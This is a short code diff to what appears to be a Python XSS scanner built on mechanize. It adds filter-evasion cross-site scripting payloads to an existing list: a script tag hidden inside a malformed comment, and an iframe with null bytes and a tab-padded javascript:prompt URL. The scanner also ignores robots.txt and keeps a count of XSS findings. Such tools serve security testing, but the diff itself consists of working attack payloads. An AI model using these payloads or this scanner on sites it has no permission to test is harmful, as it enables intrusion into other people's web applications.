@@ -14,7 +14,7 @@ br.addheaders = [
 br.set_handle_robots(False)
 br.set_handle_refresh(False)
 
-payloads = ['<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)']
+payloads = ['<! foo="><script>alert(1)</script>">', '<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>', '<svg "ons>', '" onfocus="alert(1);', 'javascript:alert(1)']
 blacklist = ['.png', '.jpg', '.jpeg', '.mp3', '.mp4', '.avi', '.gif', '.svg',
              '.pdf']
 xssLinks = []            # TOTAL CROSS SITE SCRIPTING FINDINGS
